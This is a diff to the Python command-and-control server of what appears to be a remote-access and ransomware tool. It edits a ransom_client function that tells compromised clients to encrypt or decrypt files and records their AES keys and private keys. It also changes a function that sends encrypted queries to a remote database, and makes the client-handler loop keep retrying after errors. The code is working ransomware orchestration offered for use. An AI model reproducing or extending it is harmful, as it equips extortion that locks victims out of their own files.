@@ -345,7 +345,7 @@ class Server(threading.Thread):
             buf = ''
             while '\n' not in buf:
                 try:
-                    buf += client.connection.recv(4096)
+                    buf += client.connection.recv(65536)
                 except: break
             if buf and len(bytes(buf)):
                 try:
@@ -570,42 +570,16 @@ class Server(threading.Thread):
 
     def ransom_client(self, args=None):
         if self.current_client:
-            if not args or 'encrypt' in str(args):
-                self.send_client('ransom %s' % str(args), self.current_client.name)
-                self.current_client.connection.settimeout(1.0)
-                while True:
-                    try:
-                        output = self.recv_client(self.current_client.name)
-                        if output:
-                            try:
-                                output = json.loads(output)
-                                if output.get('result') and 'file_path' in output.get('result') and 'aes_key' in output.get('result'):
-                                    result = output.get('result')
-                                    self.query_database("INSERT INTO ransom (session_id, file_path, aes_key) VALUES ('{}','{}','{}')".format(self.current_client.session, result.get('file_path'), result.get('aes_key')), display=false)
-                                else:
-                                    print("Skipping output: '{}'".format(str(output)))
-                            except:
-                                print("Skipping output: '{}'".format(str(output)))
-                    except socket.timeout:
-                        break
-                    except Exception as e:
-                        print('{} error: {}'.format(self.ransom_client.func_name, str(e)))
-
-            elif 'decrypt' in str(args):
-                try:
-                    result = self.query_database("SELECT * FROM sessions WHERE id='{}'".format(self.current_client.session), display=False)
-                    if result:
-                        result = json.loads(result)
-                        self.send_client("ransom decrypt %s" % result.get('private_key'), self.current_client.name)
-                        return
-                    else:
-                        return "Session_'{}':-No-Private-Key".format(self.current_client.session)
-                except Exception as e:
-                    return "{} returned error: {}".format(self.ransom_client.func_name, str(e))
+            if 'decrypt' in str(args):
+                self.send_client("ransom decrypt %s" % self.current_client.private_key.exportKey(), self.current_client.name)
+                return
+            else:
+                self.send_client("ransom %s" % args, self.current_client.name)
+                return
         else:
             self._error("No client selected")
             self._return()
-
+            
     def new_task_id(self, command, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
             client = self.clients[int(client_id)]
@@ -662,30 +636,32 @@ class Server(threading.Thread):
             self._return()
 
     def query_database(self, query, display=True):
-        if self.database.get('session_key'):
-            key     = self.database['session_key']
-            query   = self._encrypt_aes(query, self._deobfuscate(key))
-            data    = requests.post(self.database['domain'] + self.database['pages']['query'], data={'query': query}).content
-            if data:
-                output  = self._decrypt_aes(data, self._deobfuscate(key))
-                if output:
-                    if not display:
-                        return output
-                    else:
-                        if '\n' in str(output):
-                            output = [_ for _ in str(output).split('\n') if _ if len(str(_)) if not str(_).isspace()]
-                            i = 1
-                            result = {}
-                            for row in output:
-                                result.update({i: json.loads(row)})
-                                i += 1
-                            self._print(json.dumps(result, sort_keys=True))
+        try:
+            if self.database.get('session_key'):
+                key     = self.database['session_key']
+                query   = self._encrypt_aes(query, self._deobfuscate(key))
+                data    = requests.post(self.database['domain'] + self.database['pages']['query'], data={'query': query}).content
+                if data:
+                    output  = self._decrypt_aes(data, self._deobfuscate(key))
+                    if output:
+                        if not display:
+                            return output
                         else:
-                            self._print(output)
-        else:
-            self._error("No_session_key_found")
-            self._return()
-    
+                            if '\n' in str(output):
+                                output = [_ for _ in str(output).split('\n') if _ if len(str(_)) if not str(_).isspace()]
+                                i = 1
+                                result = {}
+                                for row in output:
+                                    result.update({i: json.loads(row)})
+                                    i += 1
+                                self._print(json.dumps(result, sort_keys=True))
+                            else:
+                                self._print(output)
+            else:
+                self._error("No_session_key_found")
+        except Exception as e:
+            print("{} error: {}".format(self.get_current_session.func_name, str(e)))
+
     def connection_handler(self):
         while True:
             connection, addr    = self.s.accept()
@@ -867,9 +843,8 @@ class ClientHandler(threading.Thread):
                     break
             except Exception as e:
                 self._error(str(e))
-                break
-        self._kill()
-
+                time.sleep(5)
+                continue
 
 if __name__ == '__main__':
     port    = int(PORT)
